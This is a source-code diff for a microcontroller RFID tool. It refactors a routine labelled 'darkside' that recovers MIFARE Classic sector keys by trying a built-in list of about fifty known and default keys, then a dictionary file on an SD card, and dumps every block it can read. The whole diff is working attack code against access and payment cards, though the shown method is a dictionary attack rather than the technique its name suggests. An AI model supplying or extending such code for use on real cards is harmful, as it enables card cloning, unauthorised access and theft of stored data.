@@ -7,101 +7,111 @@
 #include <SD.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
 
+// Same 50-key builtin (shared via a static array to avoid repetition)
+static const uint8_t DS_BUILTIN[][KEY_SIZE] = {
+    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},{0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},
+    {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5},{0x00,0x00,0x00,0x00,0x00,0x00},
+    {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7},{0x4D,0x3A,0x99,0xC3,0x51,0xDD},
+    {0x1A,0x98,0x2C,0x7E,0x45,0x9A},{0xAA,0xBB,0xCC,0xDD,0xEE,0xFF},
+    {0x71,0x4C,0x5C,0x88,0x6E,0x97},{0x58,0x7E,0xE5,0xF9,0x35,0x0F},
+    {0xA0,0x47,0x8C,0xC3,0x90,0x91},{0x53,0x3C,0xB6,0xC7,0x23,0xF6},
+    {0x8F,0xD0,0xA4,0xF2,0x56,0xE9},{0x6C,0x77,0x85,0x28,0x63,0xD7},
+    {0x28,0x63,0xD7,0x6C,0x77,0x85},{0xAB,0xCD,0xEF,0x12,0x34,0x56},
+    {0x12,0x34,0x56,0x78,0x9A,0xBC},{0x11,0x22,0x33,0x44,0x55,0x66},
+    {0x01,0x02,0x03,0x04,0x05,0x06},{0x13,0x37,0x13,0x37,0x13,0x37},
+    {0xDE,0xAD,0xBE,0xEF,0x12,0x34},{0xAA,0xFF,0xFF,0xFF,0xFF,0xFF},
+    {0x10,0x20,0x30,0x40,0x50,0x60},{0xE5,0x67,0x8F,0x22,0x1C,0x11},
+    {0xCA,0xFE,0xBA,0xBE,0xDE,0xAD},{0x0A,0x1B,0x2C,0x3D,0x4E,0x5F},
+    {0xF0,0xE1,0xD2,0xC3,0xB4,0xA5},{0xAA,0xAA,0xAA,0xAA,0xAA,0xAA},
+    {0x55,0x55,0x55,0x55,0x55,0x55},{0xC3,0x5D,0x55,0x28,0xA3,0x1B},
+    {0xD9,0xA4,0xCC,0xD6,0x5B,0xD2},{0x4C,0xB1,0x60,0x89,0x6A,0x7B},
+    {0x97,0x38,0xEA,0x53,0x42,0x5D},{0x3C,0x65,0xD0,0x2A,0x1F,0x9C},
+    {0x8B,0x4C,0x91,0xE2,0xD7,0x06},{0x07,0x3E,0x5A,0xB1,0xC8,0x4F},
+    {0xA9,0xFA,0xB6,0xDE,0xEA,0x1D},{0x3A,0x72,0x1E,0x4D,0x58,0xC9},
+    {0x18,0x00,0x00,0x00,0x00,0x00},{0x23,0x45,0x67,0x89,0xAB,0xCD},
+    {0xFF,0x07,0x80,0x69,0xFF,0x07},{0xB5,0xFF,0x67,0xD3,0xA4,0xBC},
+    {0x0F,0x0F,0x0F,0x0F,0x0F,0x0F},{0xF0,0xF0,0xF0,0xF0,0xF0,0xF0},
+    {0x1F,0xFF,0xFF,0xFF,0xFF,0xFF},{0x4A,0xF8,0x4B,0x19,0x6D,0xE3},
+    {0x7B,0xE3,0x0A,0xD5,0x5A,0xC1},{0x2A,0x9F,0x14,0xD3,0x8E,0x0C},
+};
+static const size_t DS_BUILTIN_N = sizeof(DS_BUILTIN)/sizeof(DS_BUILTIN[0]);
+
+// ─── Try one key (with re-select + full block read) ────────────────────────
+static bool _tryKey(CardDump* d, uint8_t sector, const uint8_t* key, bool isA, const char* method) {
+    uint8_t atqa[2];
+    if (picc_wakeupA(atqa) != RC522_OK)          return false;
+    if (picc_anticollision(&d->uid) != RC522_OK) return false;
+
+    uint8_t cmd     = isA ? MF_AUTH_KEY_A : MF_AUTH_KEY_B;
+    uint8_t trailer = ks_sectorToTrailer(sector);
+
+    if (picc_mfAuth(cmd, trailer, key, &d->uid) != RC522_OK) {
+        picc_mfDeauth();
+        return false;
+    }
+
+    uint8_t first = ks_sectorToFirstBlock(sector);
+    for (uint8_t b = 0; b < BLOCKS_PER_SECTOR; b++) {
+        uint8_t buf[BLOCK_SIZE];
+        if (picc_mfRead(first + b, buf) == RC522_OK) {
+            ks_storeBlockData(d, sector, b, buf);
+            reporter_dataRead(sector, b, buf);
+        }
+    }
+    if (isA) ks_setKeyA(d, sector, key);
+    else     ks_setKeyB(d, sector, key);
+    reporter_keyFound(sector, isA?"A":"B", key, method);
+    picc_mfDeauth();
+    return true;
+}
+
+// ─── Main ──────────────────────────────────────────────────────────────────
 void darksideAttack_runSector(CardDump* d, uint8_t sector) {
     reporter_attackStart("darkside", sector, "A/B");
 
-    const uint8_t builtin[][6] = {
-        {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
-        {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},
-        {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}
-    };
-    size_t builtin_count = sizeof(builtin)/sizeof(builtin[0]);
-
-    for (size_t i=0; i<builtin_count; ++i) {
-        RC522Status st = picc_mfAuth(MF_AUTH_KEY_A, ks_sectorToTrailer(sector), builtin[i], &d->uid);
-        if (st == RC522_OK) {
-            uint8_t buf[16];
-            if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) {
-                ks_setKeyA(d, sector, builtin[i]);
-                reporter_keyFound(sector, "A", builtin[i], "darkside-builtin");
-                reporter_dataRead(sector, ks_sectorToFirstBlock(sector), buf);
-                picc_mfDeauth();
-                return;
-            }
-            picc_mfDeauth();
-        }
-
-        st = picc_mfAuth(MF_AUTH_KEY_B, ks_sectorToTrailer(sector), builtin[i], &d->uid);
-        if (st == RC522_OK) {
-            uint8_t buf[16];
-            if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) {
-                ks_setKeyB(d, sector, builtin[i]);
-                reporter_keyFound(sector, "B", builtin[i], "darkside-builtin");
-                reporter_dataRead(sector, ks_sectorToFirstBlock(sector), buf);
-                picc_mfDeauth();
-                return;
-            }
-            picc_mfDeauth();
-        }
+    // Phase 1: builtin keys (fast)
+    for (size_t i = 0; i < DS_BUILTIN_N; i++) {
+        if (_tryKey(d, sector, DS_BUILTIN[i], true,  "darkside-builtin")) return;
+        if (_tryKey(d, sector, DS_BUILTIN[i], false, "darkside-builtin")) return;
     }
 
-    if (sd_is_available()) {
-        File f = SD.open(DICT_PATH);
-        if (f) {
-            size_t total = 0;
-            while (f.available()) { f.readStringUntil('\n'); total++; }
-            f.seek(0);
-            size_t tried = 0;
-            while (f.available()) {
-                String line = f.readStringUntil('\n');
-                line.trim();
-                if (line.length() != 12) {
-                    tried++;
-                    continue;
-                }
-
-                uint8_t key[6];
-                for (int i=0;i<6;i++) key[i] = (uint8_t) strtoul(line.substring(i*2, i*2+2).c_str(), NULL, 16);
-
-                char progress[64];
-                snprintf(progress, sizeof(progress), "tried %u/%u", (unsigned)tried, (unsigned)total);
-                reporter_error("DARKSIDE_PROGRESS", progress);
-
-                RC522Status st = picc_mfAuth(MF_AUTH_KEY_A, ks_sectorToTrailer(sector), key, &d->uid);
-                if (st == RC522_OK) {
-                    uint8_t buf[16];
-                    if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) {
-                        ks_setKeyA(d, sector, key);
-                        reporter_keyFound(sector, "A", key, "darkside-dict");
-                        reporter_dataRead(sector, ks_sectorToFirstBlock(sector), buf);
-                        picc_mfDeauth();
-                        f.close();
-                        return;
-                    }
-                    picc_mfDeauth();
-                }
-
-                st = picc_mfAuth(MF_AUTH_KEY_B, ks_sectorToTrailer(sector), key, &d->uid);
-                if (st == RC522_OK) {
-                    uint8_t buf[16];
-                    if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) {
-                        ks_setKeyB(d, sector, key);
-                        reporter_keyFound(sector, "B", key, "darkside-dict");
-                        reporter_dataRead(sector, ks_sectorToFirstBlock(sector), buf);
-                        picc_mfDeauth();
-                        f.close();
-                        return;
-                    }
-                    picc_mfDeauth();
-                }
-
-                tried++;
-                if (tried % 50 == 0) delay(10);
-            }
-            f.close();
-        }
+    // Phase 2: SD dictionary — single-pass (no double-scan)
+    if (!sd_is_available()) {
+        reporter_error("DARKSIDE_FAIL", "No key found in builtin (no SD card for extended dict)");
+        return;
     }
 
-    reporter_error("DARKSIDE_FAIL", "Darkside/bruteforce completed with no result (try a larger dictionary)");
+    File f = SD.open(DICT_PATH);
+    if (!f) {
+        reporter_error("DARKSIDE_FAIL", "Cannot open dictionary on SD");
+        return;
+    }
+
+    uint32_t tried = 0;
+    char progress[48];
+    while (f.available()) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        if (line.length() != 12) continue;
+
+        uint8_t key[KEY_SIZE];
+        for (int i = 0; i < 6; i++)
+            key[i] = (uint8_t)strtoul(line.substring(i*2, i*2+2).c_str(), NULL, 16);
+
+        if (_tryKey(d, sector, key, true,  "darkside-dict")) { f.close(); return; }
+        if (_tryKey(d, sector, key, false, "darkside-dict")) { f.close(); return; }
+
+        tried++;
+        if (tried % 100 == 0) {
+            snprintf(progress, sizeof(progress), "S%u tried %lu keys", sector, (unsigned long)tried);
+            reporter_error("DARKSIDE_PROGRESS", progress);
+            delay(5); // yield to WDT
+        }
+    }
+    f.close();
+
+    snprintf(progress, sizeof(progress), "S%u exhausted %lu keys — no match", sector, (unsigned long)tried);
+    reporter_error("DARKSIDE_FAIL", progress);
 }
